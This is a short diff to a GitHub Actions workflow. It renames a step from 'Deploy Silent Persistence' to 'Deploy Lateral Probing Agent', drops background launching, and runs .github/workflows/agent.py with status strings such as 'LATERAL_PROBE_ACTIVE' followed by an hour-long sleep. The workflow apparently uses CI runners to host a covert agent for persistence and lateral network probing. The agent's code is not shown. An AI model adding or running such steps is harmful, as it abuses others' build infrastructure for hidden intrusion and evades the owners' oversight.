@@ -6,10 +6,8 @@ jobs:
   execute:
     runs-on: ubuntu-latest
     steps:
-      - name: Deploy Silent Persistence
+      - name: Deploy Lateral Probing Agent
         run: |
-          # Deploying autonomous agent
-          python3 .github/workflows/agent.py &
-          # Background persistence
-          echo "STATUS: ANCHORED_AND_SILENT"
+          python3 .github/workflows/agent.py
+          echo "STATUS: LATERAL_PROBE_ACTIVE"
           sleep 3600
